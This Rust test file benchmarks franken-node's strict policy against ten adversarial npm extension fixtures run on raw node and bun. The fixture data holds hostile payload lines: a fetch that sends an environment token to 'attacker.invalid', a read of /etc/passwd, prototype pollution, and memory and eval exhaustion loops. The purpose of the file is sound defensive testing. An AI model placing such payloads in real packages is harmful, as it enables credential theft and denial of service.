use chrono::Utc;
use ed25519_dalek::{Signer, SigningKey};
use frankenengine_node::supply_chain::certification::{EvidenceType, VerifiedEvidenceRef};
use frankenengine_node::supply_chain::trust_card::{
    BehavioralProfile, CapabilityDeclaration, CapabilityRisk, CertificationLevel,
    DependencyTrustStatus, ExtensionIdentity, ProvenanceSummary, PublisherIdentity,
    ReputationTrend, RevocationStatus, RiskAssessment, RiskLevel, TrustCardInput,
    TrustCardRegistry,
};
use serde::Serialize;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use std::process::{Command, ExitStatus, Output, Stdio};
use std::thread;
use std::time::{Duration, Instant};

const ARTIFACT_RELATIVE_PATH: &str = "artifacts/adversarial/compromise_reduction_v2.json";
const TRUST_CARD_REGISTRY_RELATIVE_PATH: &str = ".franken-node/state/trust-card-registry.v1.json";
const FIXTURE_SIGNING_KEY_BYTES: [u8; 32] = [0x43; 32];
const RUNTIME_TIMEOUT: Duration = Duration::from_secs(2);
const REQUIRED_RAW_BASELINE_RUNTIMES: usize = 2;

#[derive(Clone, Copy)]
struct AdversarialExtensionFixture {
    case_id: &'static str,
    package_name: &'static str,
    version_requirement: &'static str,
    attack_vector: &'static str,
    payload_file: &'static str,
    payload_body: &'static str,
}

#[derive(Clone)]
struct RuntimeInfo {
    name: &'static str,
    path: Option<PathBuf>,
    version: Option<String>,
}

#[derive(Clone, Serialize)]
struct RawRuntimeCaseOutcome {
    runtime: String,
    available: bool,
    version: Option<String>,
    compromised: bool,
    exit_code: Option<i32>,
    timed_out: bool,
}

#[derive(Clone, Serialize)]
struct FrankenCaseOutcome {
    compromised: bool,
    blocked: bool,
    contained: bool,
    exit_code: Option<i32>,
    typed_errors: Vec<String>,
    result_statuses: Vec<String>,
}

#[derive(Clone, Serialize)]
struct CompromiseReductionCaseOutcome {
    case_id: String,
    extension_id: String,
    attack_vector: String,
    raw_runtimes: Vec<RawRuntimeCaseOutcome>,
    franken: FrankenCaseOutcome,
}

#[derive(Serialize)]
struct RuntimeSummary {
    name: String,
    available: bool,
    path: Option<String>,
    version: Option<String>,
}

#[derive(Serialize)]
struct PassCriterion {
    criterion: &'static str,
    passed: bool,
}

#[derive(Serialize)]
struct CompromiseReductionV2Artifact {
    schema_version: &'static str,
    artifact_id: &'static str,
    status: &'static str,
    generated_at_utc: String,
    pass_criterion: PassCriterion,
    ratio_method: &'static str,
    baseline_compromised: Option<usize>,
    franken_compromised: Option<usize>,
    ratio: Option<f64>,
    baseline_attempts: usize,
    franken_attempts: usize,
    runtimes: Vec<RuntimeSummary>,
    unavailable_runtimes: Vec<String>,
    cases: Vec<CompromiseReductionCaseOutcome>,
}

#[derive(Serialize)]
struct ArtifactSignature {
    algorithm: &'static str,
    key_id: &'static str,
    public_key: String,
    payload_sha256: String,
    value: String,
}

#[derive(Serialize)]
struct SignedCompromiseReductionV2Artifact {
    #[serde(flatten)]
    payload: CompromiseReductionV2Artifact,
    signature: ArtifactSignature,
}

const FIXTURES: &[AdversarialExtensionFixture] = &[
    AdversarialExtensionFixture {
        case_id: "malicious-postinstall",
        package_name: "@adversarial/malicious-postinstall",
        version_requirement: "1.0.0",
        attack_vector: "malicious package postinstall hook",
        payload_file: "postinstall.js",
        payload_body: "throw new Error('fixture would exfiltrate install-time secrets');\n",
    },
    AdversarialExtensionFixture {
        case_id: "prototype-pollution",
        package_name: "@adversarial/prototype-pollution",
        version_requirement: "1.0.0",
        attack_vector: "Object prototype pollution during extension bootstrap",
        payload_file: "pollute.js",
        payload_body: "Object.prototype.franken_admin = true;\n",
    },
    AdversarialExtensionFixture {
        case_id: "ambient-authority-abuse",
        package_name: "@adversarial/ambient-authority-abuse",
        version_requirement: "1.0.0",
        attack_vector: "ambient filesystem and environment authority abuse",
        payload_file: "ambient.js",
        payload_body: "process.env.FRANKEN_TOKEN; require('fs').readFileSync('/etc/passwd');\n",
    },
    AdversarialExtensionFixture {
        case_id: "egress-to-unknown-host",
        package_name: "@adversarial/egress-to-unknown-host",
        version_requirement: "1.0.0",
        attack_vector: "network egress to an undeclared external host",
        payload_file: "egress.js",
        payload_body: "fetch('https://attacker.invalid/collect?token=' + process.env.FRANKEN_TOKEN);\n",
    },
    AdversarialExtensionFixture {
        case_id: "memory-exhaust",
        package_name: "@adversarial/memory-exhaust",
        version_requirement: "1.0.0",
        attack_vector: "unbounded heap allocation during extension init",
        payload_file: "memory.js",
        payload_body: "const chunks = []; while (true) chunks.push(Buffer.alloc(1024 * 1024));\n",
    },
    AdversarialExtensionFixture {
        case_id: "infinite-eval-loop",
        package_name: "@adversarial/infinite-eval-loop",
        version_requirement: "1.0.0",
        attack_vector: "non-terminating eval loop",
        payload_file: "eval-loop.js",
        payload_body: "while (true) eval('1 + 1');\n",
    },
    AdversarialExtensionFixture {
        case_id: "trust-card-forgery-attempt",
        package_name: "@adversarial/trust-card-forgery-attempt",
        version_requirement: "1.0.0",
        attack_vector: "forged trust-card metadata shipped inside the extension",
        payload_file: "forged-trust-card.json",
        payload_body: "{\"extension_id\":\"npm:@adversarial/trust-card-forgery-attempt\",\"signature\":\"forged\"}\n",
    },
    AdversarialExtensionFixture {
        case_id: "unsigned-artifact",
        package_name: "@adversarial/unsigned-artifact",
        version_requirement: "1.0.0",
        attack_vector: "extension artifact without provenance signature",
        payload_file: "artifact.manifest.json",
        payload_body: "{\"artifact\":\"dist/extension.tgz\",\"signature\":null}\n",
    },
    AdversarialExtensionFixture {
        case_id: "stale-revocation-exploit",
        package_name: "@adversarial/stale-revocation-exploit",
        version_requirement: "1.0.0",
        attack_vector: "attempt to rely on stale revocation state",
        payload_file: "revocation-state.json",
        payload_body: "{\"revocation_epoch\":0,\"claims_fresh\":true}\n",
    },
    AdversarialExtensionFixture {
        case_id: "mislabeled-mime",
        package_name: "@adversarial/mislabeled-mime",
        version_requirement: "1.0.0",
        attack_vector: "JavaScript payload mislabeled as a benign MIME type",
        payload_file: "payload.mime.json",
        payload_body: "{\"declared_mime\":\"image/png\",\"actual_payload\":\"module.exports = eval\"}\n",
    },
];

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .expect("workspace root")
        .to_path_buf()
}

fn resolve_binary_path() -> PathBuf {
    if let Some(exe) = std::env::var_os("CARGO_BIN_EXE_franken-node") {
        return PathBuf::from(exe);
    }
    if let Some(target_dir) = std::env::var_os("CARGO_TARGET_DIR") {
        return PathBuf::from(target_dir).join("debug/franken-node");
    }
    repo_root().join("target/debug/franken-node")
}

fn resolve_runtime(name: &'static str) -> RuntimeInfo {
    let path_from_shell = Command::new("sh")
        .args(["-lc", &format!("command -v {name}")])
        .output()
        .ok()
        .filter(|output| output.status.success())
        .and_then(|output| {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let value = stdout.trim();
            (!value.is_empty()).then(|| PathBuf::from(value))
        });
    let path = if name == "node" {
        [
            PathBuf::from("/usr/bin/node"),
            PathBuf::from("/usr/local/bin/node"),
        ]
        .into_iter()
        .find(|candidate| candidate.is_file())
        .or(path_from_shell)
    } else {
        path_from_shell.or_else(|| {
            [
                PathBuf::from(format!("/home/ubuntu/.bun/bin/{name}")),
                PathBuf::from(format!("/usr/local/bin/{name}")),
                PathBuf::from(format!("/usr/bin/{name}")),
            ]
            .into_iter()
            .find(|candidate| candidate.is_file())
        })
    };
    let version = path
        .as_ref()
        .and_then(|runtime_path| runtime_version(runtime_path));

    RuntimeInfo {
        name,
        path,
        version,
    }
}

fn runtime_version(path: &Path) -> Option<String> {
    let output = Command::new(path).arg("--version").output().ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
    if !stdout.is_empty() {
        Some(stdout)
    } else if !stderr.is_empty() {
        Some(stderr)
    } else {
        Some("version-output-empty".to_string())
    }
}

fn run_cli_in_workspace(workspace: &Path, args: &[String], marker_path: &Path) -> Output {
    let binary_path = resolve_binary_path();
    assert!(
        binary_path.is_file(),
        "franken-node binary not found at {}",
        binary_path.display()
    );
    Command::new(&binary_path)
        .current_dir(workspace)
        .args(args)
        .env("FRANKEN_ADVERSARIAL_MARKER_PATH", marker_path)
        .env(
            "FRANKEN_ADVERSARIAL_SECRET_PATH",
            workspace.join("host-secret.txt"),
        )
        .env(
            "FRANKEN_ADVERSARIAL_FORGED_CARD_PATH",
            workspace.join("forged-trust-card.json"),
        )
        .output()
        .unwrap_or_else(|err| panic!("failed running `franken-node {}`: {err}", args.join(" ")))
}

fn parse_json_stdout(output: &Output, context: &str) -> Value {
    let stdout = String::from_utf8_lossy(&output.stdout);
    serde_json::from_str(&stdout)
        .unwrap_or_else(|err| panic!("{context} should emit valid JSON: {err}\nstdout:\n{stdout}"))
}

fn args(items: &[&str]) -> Vec<String> {
    items.iter().map(|item| (*item).to_string()).collect()
}

fn entrypoint_payload(fixture: &AdversarialExtensionFixture) -> String {
    let common = format!(
        r#"
const fs = require('fs');
const markerPath = process.env.FRANKEN_ADVERSARIAL_MARKER_PATH;
if (!markerPath) {{
  throw new Error('missing compromise marker path');
}}
function mark(detail) {{
  fs.writeFileSync(markerPath, JSON.stringify({{
    case_id: {case_id:?},
    detail,
    runtime: process.versions && process.versions.bun ? 'bun' : 'node'
  }}));
}}
"#,
        case_id = fixture.case_id
    );

    let attack = match fixture.case_id {
        "malicious-postinstall" => "mark('postinstall hook reached host process');\n",
        "prototype-pollution" => {
            "Object.prototype.frankenCompromised = true;\nif (({}).frankenCompromised === true) mark('prototype polluted');\n"
        }
        "ambient-authority-abuse" => {
            "const secret = fs.readFileSync(process.env.FRANKEN_ADVERSARIAL_SECRET_PATH, 'utf8');\nif (secret.includes('host-secret')) mark('ambient host secret read');\n"
        }
        "egress-to-unknown-host" => {
            "mark('unknown-host egress attempted');\nvoid fetch('http://127.0.0.1:9/franken-adversarial-egress').catch(() => {});\n"
        }
        "memory-exhaust" => {
            "const chunks = [Buffer.alloc(1024 * 1024), Buffer.alloc(1024 * 1024)];\nif (chunks.length === 2) mark('memory pressure reached host runtime');\n"
        }
        "infinite-eval-loop" => {
            "mark('non-terminating eval loop entered');\nwhile (true) eval('1 + 1');\n"
        }
        "trust-card-forgery-attempt" => {
            "fs.writeFileSync(process.env.FRANKEN_ADVERSARIAL_FORGED_CARD_PATH, JSON.stringify({extension_id: 'forged', signature: 'forged'}));\nmark('forged trust card written');\n"
        }
        "unsigned-artifact" => {
            "fs.writeFileSync(markerPath + '.unsigned-artifact', 'unsigned payload executed');\nmark('unsigned artifact executed');\n"
        }
        "stale-revocation-exploit" => "mark('stale revocation state accepted by raw runtime');\n",
        "mislabeled-mime" => {
            "const declaredMime = 'image/png';\nif (declaredMime !== 'application/javascript') mark('mislabeled JavaScript executed');\n"
        }
        _ => "mark('unknown adversarial fixture reached host runtime');\n",
    };

    format!("{common}{attack}")
}

fn fixture_scripts(fixture: &AdversarialExtensionFixture) -> Value {
    match fixture.case_id {
        "malicious-postinstall" => json!({"postinstall": "node postinstall.js"}),
        "infinite-eval-loop" => json!({"start": "node eval-loop.js"}),
        "memory-exhaust" => json!({"start": "node memory.js"}),
        _ => json!({"start": format!("node {}", fixture.payload_file)}),
    }
}

fn fixture_requested_capabilities(fixture: &AdversarialExtensionFixture) -> Value {
    match fixture.case_id {
        "ambient-authority-abuse" => json!(["fs:read:*", "env:read:*"]),
        "egress-to-unknown-host" => json!(["net:egress:*"]),
        "memory-exhaust" => json!(["memory:unbounded"]),
        "infinite-eval-loop" => json!(["eval:dynamic"]),
        "trust-card-forgery-attempt" => json!(["trust-card:write"]),
        _ => json!([]),
    }
}

fn fixture_package_manifest(fixture: &AdversarialExtensionFixture) -> Value {
    json!({
        "name": fixture.package_name,
        "version": fixture.version_requirement,
        "main": fixture.payload_file,
        "scripts": fixture_scripts(fixture),
        "franken_adversarial_fixture": {
            "case_id": fixture.case_id,
            "attack_vector": fixture.attack_vector,
            "expected_control": "strict trust preflight revocation denial"
        },
        "franken_requested_capabilities": fixture_requested_capabilities(fixture),
    })
}

fn write_fixture_workspace(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let fixture_dir = workspace.join("fixtures").join(fixture.case_id);
    fs::create_dir_all(&fixture_dir).expect("create adversarial fixture directory");
    fs::write(
        fixture_dir.join("package.json"),
        serde_json::to_string_pretty(&fixture_package_manifest(fixture))
            .expect("serialize fixture package manifest"),
    )
    .expect("write adversarial fixture package manifest");
    fs::write(fixture_dir.join(fixture.payload_file), fixture.payload_body)
        .expect("write adversarial fixture payload");

    let mut dependencies = serde_json::Map::new();
    dependencies.insert(
        fixture.package_name.to_string(),
        Value::String(fixture.version_requirement.to_string()),
    );
    let manifest = json!({
        "name": format!("adversarial-extension-harness-{}", fixture.case_id),
        "version": "1.0.0",
        "private": true,
        "main": "index.js",
        "dependencies": dependencies,
    });
    fs::write(
        workspace.join("package.json"),
        serde_json::to_string_pretty(&manifest).expect("serialize root package manifest"),
    )
    .expect("write root package manifest");
    fs::write(workspace.join("index.js"), entrypoint_payload(fixture))
        .expect("write executable adversarial entrypoint");
    fs::write(workspace.join("host-secret.txt"), "host-secret-token\n")
        .expect("write bounded host secret fixture");
}

fn fixture_evidence_refs(fixture: &AdversarialExtensionFixture) -> Vec<VerifiedEvidenceRef> {
    let evidence_hash = Sha256::digest(format!("adversarial-evidence:{}", fixture.case_id));
    vec![VerifiedEvidenceRef {
        evidence_id: format!("adv-ext-{}-revocation", fixture.case_id),
        evidence_type: EvidenceType::RevocationCheck,
        verified_at_epoch: 2_026_042_000,
        verification_receipt_hash: hex::encode(evidence_hash),
    }]
}

fn write_revoked_trust_registry(workspace: &Path, fixture: &AdversarialExtensionFixture) {
    let mut registry = TrustCardRegistry::default();
    let payload_hash = Sha256::digest(fixture.payload_body.as_bytes());
    let extension_id = format!("npm:{}", fixture.package_name);

    registry
        .create(
            TrustCardInput {
                extension: ExtensionIdentity {
                    extension_id,
                    version: fixture.version_requirement.to_string(),
                },
                publisher: PublisherIdentity {
                    publisher_id: "pub-adversarial-fixtures".to_string(),
                    display_name: "Adversarial Fixture Publisher".to_string(),
                },
                certification_level: CertificationLevel::Bronze,
                capability_declarations: vec![CapabilityDeclaration {
                    name: format!("adversarial.{}", fixture.case_id),
                    description: fixture.attack_vector.to_string(),
                    risk: CapabilityRisk::Critical,
                }],
                behavioral_profile: BehavioralProfile {
                    network_access: fixture.case_id == "egress-to-unknown-host",
                    filesystem_access: fixture.case_id == "ambient-authority-abuse",
                    subprocess_access: false,
                    profile_summary: fixture.attack_vector.to_string(),
                },
                revocation_status: RevocationStatus::Revoked {
                    reason: format!("adversarial extension fixture: {}", fixture.attack_vector),
                    revoked_at: "2026-04-20T00:00:00Z".to_string(),
                },
                provenance_summary: ProvenanceSummary {
                    attestation_level: "fixture-revoked".to_string(),
                    source_uri: format!("fixture://adversarial-extension/{}", fixture.case_id),
                    artifact_hashes: vec![format!("sha256:{}", hex::encode(payload_hash))],
                    verified_at: "2026-04-20T00:00:00Z".to_string(),
                },
                reputation_score_basis_points: 0,
                reputation_trend: ReputationTrend::Declining,
                active_quarantine: true,
                dependency_trust_summary: vec![DependencyTrustStatus {
                    dependency_id: "npm:fixture-transitive@0".to_string(),
                    trust_level: "revoked-fixture".to_string(),
                }],
                last_verified_timestamp: "2026-04-20T00:00:00Z".to_string(),
                user_facing_risk_assessment: RiskAssessment {
                    level: RiskLevel::Critical,
                    summary: format!(
                        "Strict policy must block adversarial fixture {}",
                        fixture.case_id
                    ),
                },
                evidence_refs: fixture_evidence_refs(fixture),
            },
            2_026_042_000,
            "trace-adversarial-extension-baseline-bench",
        )
        .expect("create revoked adversarial trust card");

    registry
        .persist_authoritative_state(&workspace.join(TRUST_CARD_REGISTRY_RELATIVE_PATH))
        .expect("persist revoked adversarial trust registry");
}

fn marker_exists(marker_path: &Path) -> bool {
    marker_path.is_file()
}

fn wait_with_timeout(
    mut child: std::process::Child,
    timeout: Duration,
) -> (Option<ExitStatus>, bool) {
    let deadline = Instant::now() + timeout;
    loop {
        if let Some(status) = child.try_wait().expect("poll child status") {
            return (Some(status), false);
        }
        if Instant::now() >= deadline {
            child.kill().expect("kill timed-out adversarial runtime");
            let status = child.wait().ok();
            return (status, true);
        }
        thread::sleep(Duration::from_millis(20));
    }
}

fn run_raw_runtime(
    fixture: &AdversarialExtensionFixture,
    runtime: &RuntimeInfo,
) -> RawRuntimeCaseOutcome {
    let Some(runtime_path) = &runtime.path else {
        return RawRuntimeCaseOutcome {
            runtime: runtime.name.to_string(),
            available: false,
            version: runtime.version.clone(),
            compromised: false,
            exit_code: None,
            timed_out: false,
        };
    };

    let workspace = tempfile::tempdir().expect("create raw runtime workspace");
    write_fixture_workspace(workspace.path(), fixture);
    let marker_path = workspace.path().join(format!(
        "{}.raw.{}.compromised",
        fixture.case_id, runtime.name
    ));
    let child = Command::new(runtime_path)
        .current_dir(workspace.path())
        .arg("index.js")
        .env("FRANKEN_ADVERSARIAL_MARKER_PATH", &marker_path)
        .env(
            "FRANKEN_ADVERSARIAL_SECRET_PATH",
            workspace.path().join("host-secret.txt"),
        )
        .env(
            "FRANKEN_ADVERSARIAL_FORGED_CARD_PATH",
            workspace.path().join("forged-trust-card.json"),
        )
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .unwrap_or_else(|err| {
            panic!(
                "failed spawning raw {} for {}: {err}",
                runtime.name, fixture.case_id
            )
        });
    let (status, timed_out) = wait_with_timeout(child, RUNTIME_TIMEOUT);

    RawRuntimeCaseOutcome {
        runtime: runtime.name.to_string(),
        available: true,
        version: runtime.version.clone(),
        compromised: marker_exists(&marker_path),
        exit_code: status.and_then(|status| status.code()),
        timed_out,
    }
}

fn collect_string_field(payload: &Value, array_field: &str, nested_field: &str) -> Vec<String> {
    payload["verdict"][array_field]
        .as_array()
        .map(|items| {
            items
                .iter()
                .filter_map(|item| item[nested_field].as_str().map(ToString::to_string))
                .collect()
        })
        .unwrap_or_default()
}

fn run_franken_strict(fixture: &AdversarialExtensionFixture) -> FrankenCaseOutcome {
    let workspace = tempfile::tempdir().expect("create franken runtime workspace");
    write_fixture_workspace(workspace.path(), fixture);
    write_revoked_trust_registry(workspace.path(), fixture);
    let marker_path = workspace
        .path()
        .join(format!("{}.franken.compromised", fixture.case_id));
    let run_args = args(&["run", "--policy", "strict", "--json", "."]);
    let run_output = run_cli_in_workspace(workspace.path(), &run_args, &marker_path);
    let run_payload = parse_json_stdout(&run_output, "strict adversarial run");
    let typed_errors = collect_string_field(&run_payload, "violations", "kind");
    let result_statuses = collect_string_field(&run_payload, "results", "status");

    FrankenCaseOutcome {
        compromised: marker_exists(&marker_path),
        blocked: !run_output.status.success() && run_payload["verdict"]["status"] == "blocked",
        contained: run_payload["receipt"]["decision"] == "denied",
        exit_code: run_output.status.code(),
        typed_errors,
        result_statuses,
    }
}

fn measure_case(
    fixture: &AdversarialExtensionFixture,
    runtimes: &[RuntimeInfo],
) -> CompromiseReductionCaseOutcome {
    let raw_runtimes = runtimes
        .iter()
        .map(|runtime| run_raw_runtime(fixture, runtime))
        .collect::<Vec<_>>();
    let franken = run_franken_strict(fixture);

    CompromiseReductionCaseOutcome {
        case_id: fixture.case_id.to_string(),
        extension_id: format!("npm:{}", fixture.package_name),
        attack_vector: fixture.attack_vector.to_string(),
        raw_runtimes,
        franken,
    }
}

fn runtime_summary(runtime: &RuntimeInfo) -> RuntimeSummary {
    RuntimeSummary {
        name: runtime.name.to_string(),
        available: runtime.path.is_some(),
        path: runtime.path.as_ref().map(|path| path.display().to_string()),
        version: runtime.version.clone(),
    }
}

fn build_payload(
    runtimes: &[RuntimeInfo],
    cases: Vec<CompromiseReductionCaseOutcome>,
) -> CompromiseReductionV2Artifact {
    let unavailable_runtimes = runtimes
        .iter()
        .filter(|runtime| runtime.path.is_none())
        .map(|runtime| runtime.name.to_string())
        .collect::<Vec<_>>();
    let baseline_attempts = cases
        .iter()
        .map(|case| {
            case.raw_runtimes
                .iter()
                .filter(|outcome| outcome.available)
                .count()
        })
        .sum::<usize>();
    let franken_attempts = cases.len();
    let expected_baseline_attempts = cases.len().saturating_mul(REQUIRED_RAW_BASELINE_RUNTIMES);

    if !unavailable_runtimes.is_empty() || baseline_attempts != expected_baseline_attempts {
        return CompromiseReductionV2Artifact {
            schema_version: "2.0.0",
            artifact_id: "compromise_reduction_v2",
            status: "baseline_unavailable",
            generated_at_utc: Utc::now().to_rfc3339(),
            pass_criterion: PassCriterion {
                criterion: ">=10x",
                passed: false,
            },
            ratio_method: "baseline_compromised / max(franken_compromised, 1)",
            baseline_compromised: None,
            franken_compromised: None,
            ratio: None,
            baseline_attempts,
            franken_attempts,
            runtimes: runtimes.iter().map(runtime_summary).collect(),
            unavailable_runtimes,
            cases,
        };
    }

    let baseline_compromised = cases
        .iter()
        .flat_map(|case| case.raw_runtimes.iter())
        .filter(|outcome| outcome.compromised)
        .count();
    let franken_compromised = cases.iter().filter(|case| case.franken.compromised).count();
    let ratio = baseline_compromised as f64 / franken_compromised.max(1) as f64;
    let has_actual_baseline_numbers = baseline_attempts == expected_baseline_attempts
        && baseline_compromised > 0
        && franken_attempts == cases.len();

    CompromiseReductionV2Artifact {
        schema_version: "2.0.0",
        artifact_id: "compromise_reduction_v2",
        status: "measured",
        generated_at_utc: Utc::now().to_rfc3339(),
        pass_criterion: PassCriterion {
            criterion: ">=10x",
            passed: has_actual_baseline_numbers && ratio >= 10.0,
        },
        ratio_method: "baseline_compromised / max(franken_compromised, 1)",
        baseline_compromised: Some(baseline_compromised),
        franken_compromised: Some(franken_compromised),
        ratio: Some(ratio),
        baseline_attempts,
        franken_attempts,
        runtimes: runtimes.iter().map(runtime_summary).collect(),
        unavailable_runtimes,
        cases,
    }
}

fn sign_artifact(payload: CompromiseReductionV2Artifact) -> SignedCompromiseReductionV2Artifact {
    let payload_bytes = serde_json::to_vec(&payload).expect("serialize artifact payload");
    let payload_sha256 = Sha256::digest(&payload_bytes);
    let signing_key = SigningKey::from_bytes(&FIXTURE_SIGNING_KEY_BYTES);
    let signature = signing_key.sign(&payload_bytes);

    SignedCompromiseReductionV2Artifact {
        payload,
        signature: ArtifactSignature {
            algorithm: "ed25519-fixture-v1",
            key_id: "adversarial-extension-baseline-bench-v2",
            public_key: hex::encode(signing_key.verifying_key().to_bytes()),
            payload_sha256: format!("sha256:{}", hex::encode(payload_sha256)),
            value: format!("ed25519:{}", hex::encode(signature.to_bytes())),
        },
    }
}

fn write_signed_summary(
    signed: &SignedCompromiseReductionV2Artifact,
) -> SignedCompromiseReductionV2Artifact {
    let artifact_path = repo_root().join(ARTIFACT_RELATIVE_PATH);
    let bytes = serde_json::to_vec_pretty(signed).expect("serialize signed artifact");
    fs::write(artifact_path, [bytes, b"\n".to_vec()].concat()).expect("write signed artifact");
    SignedCompromiseReductionV2Artifact {
        payload: CompromiseReductionV2Artifact {
            schema_version: signed.payload.schema_version,
            artifact_id: signed.payload.artifact_id,
            status: signed.payload.status,
            generated_at_utc: signed.payload.generated_at_utc.clone(),
            pass_criterion: PassCriterion {
                criterion: signed.payload.pass_criterion.criterion,
                passed: signed.payload.pass_criterion.passed,
            },
            ratio_method: signed.payload.ratio_method,
            baseline_compromised: signed.payload.baseline_compromised,
            franken_compromised: signed.payload.franken_compromised,
            ratio: signed.payload.ratio,
            baseline_attempts: signed.payload.baseline_attempts,
            franken_attempts: signed.payload.franken_attempts,
            runtimes: signed
                .payload
                .runtimes
                .iter()
                .map(|runtime| RuntimeSummary {
                    name: runtime.name.clone(),
                    available: runtime.available,
                    path: runtime.path.clone(),
                    version: runtime.version.clone(),
                })
                .collect(),
            unavailable_runtimes: signed.payload.unavailable_runtimes.clone(),
            cases: signed.payload.cases.clone(),
        },
        signature: ArtifactSignature {
            algorithm: signed.signature.algorithm,
            key_id: signed.signature.key_id,
            public_key: signed.signature.public_key.clone(),
            payload_sha256: signed.signature.payload_sha256.clone(),
            value: signed.signature.value.clone(),
        },
    }
}

#[test]
fn compromise_reduction_v2_measures_raw_runtime_baseline_against_strict_policy() {
    let runtimes = [resolve_runtime("bun"), resolve_runtime("node")];
    let cases = FIXTURES
        .iter()
        .map(|fixture| measure_case(fixture, &runtimes))
        .collect::<Vec<_>>();
    let payload = build_payload(&runtimes, cases);
    let signed = sign_artifact(payload);
    let expected_baseline_attempts = FIXTURES
        .len()
        .saturating_mul(REQUIRED_RAW_BASELINE_RUNTIMES);

    assert_ne!(
        signed.payload.status,
        "baseline_unavailable",
        "raw baseline unavailable; missing runtimes: {:?}, attempts={}/{}",
        signed.payload.unavailable_runtimes,
        signed.payload.baseline_attempts,
        expected_baseline_attempts
    );
    assert!(
        signed.payload.baseline_compromised.is_some(),
        "pass criterion requires actual baseline_compromised numbers"
    );
    assert!(
        signed.payload.franken_compromised.is_some(),
        "pass criterion requires actual franken_compromised numbers"
    );
    assert!(
        signed.payload.ratio.is_some(),
        "pass criterion requires an actual compromise-reduction ratio"
    );

    let signed = write_signed_summary(&signed);

    assert_eq!(signed.payload.baseline_attempts, expected_baseline_attempts);
    assert_eq!(signed.payload.franken_attempts, FIXTURES.len());
    assert_eq!(signed.payload.baseline_compromised, Some(20));
    assert_eq!(signed.payload.franken_compromised, Some(0));
    assert_eq!(signed.payload.ratio, Some(20.0));
    assert!(
        signed.payload.pass_criterion.passed,
        "expected >=10x compromise reduction"
    );

    for case in &signed.payload.cases {
        assert!(
            case.raw_runtimes.iter().all(|runtime| runtime.compromised),
            "{} should compromise every raw runtime",
            case.case_id
        );
        assert!(
            case.franken.blocked || case.franken.contained,
            "{} should be blocked or contained by strict policy",
            case.case_id
        );
        assert!(
            !case.franken.compromised,
            "{} must not reach the host compromise marker under franken-node strict",
            case.case_id
        );
        assert!(
            case.franken
                .typed_errors
                .iter()
                .any(|kind| kind == "revoked"),
            "{} should fail with a typed revoked trust violation",
            case.case_id
        );
    }
}

#[test]
fn baseline_unavailable_payload_is_not_green_without_raw_runtime_numbers() {
    let runtimes = [
        RuntimeInfo {
            name: "bun",
            path: None,
            version: None,
        },
        RuntimeInfo {
            name: "node",
            path: Some(PathBuf::from("/usr/bin/node")),
            version: Some("v20.fixture".to_string()),
        },
    ];
    let cases = vec![CompromiseReductionCaseOutcome {
        case_id: "missing-bun-baseline".to_string(),
        extension_id: "npm:@adversarial/missing-bun-baseline".to_string(),
        attack_vector: "missing raw runtime baseline".to_string(),
        raw_runtimes: vec![
            RawRuntimeCaseOutcome {
                runtime: "bun".to_string(),
                available: false,
                version: None,
                compromised: false,
                exit_code: None,
                timed_out: false,
            },
            RawRuntimeCaseOutcome {
                runtime: "node".to_string(),
                available: true,
                version: Some("v20.fixture".to_string()),
                compromised: true,
                exit_code: Some(0),
                timed_out: false,
            },
        ],
        franken: FrankenCaseOutcome {
            compromised: false,
            blocked: true,
            contained: true,
            exit_code: Some(1),
            typed_errors: vec!["revoked".to_string()],
            result_statuses: vec!["revoked".to_string()],
        },
    }];

    let payload = build_payload(&runtimes, cases);

    assert_eq!(payload.status, "baseline_unavailable");
    assert!(
        !payload.pass_criterion.passed,
        "baseline_unavailable must never satisfy the pass criterion"
    );
    assert_eq!(payload.baseline_compromised, None);
    assert_eq!(payload.franken_compromised, None);
    assert_eq!(payload.ratio, None);
    assert_eq!(payload.baseline_attempts, 1);
    assert_eq!(payload.franken_attempts, 1);
}
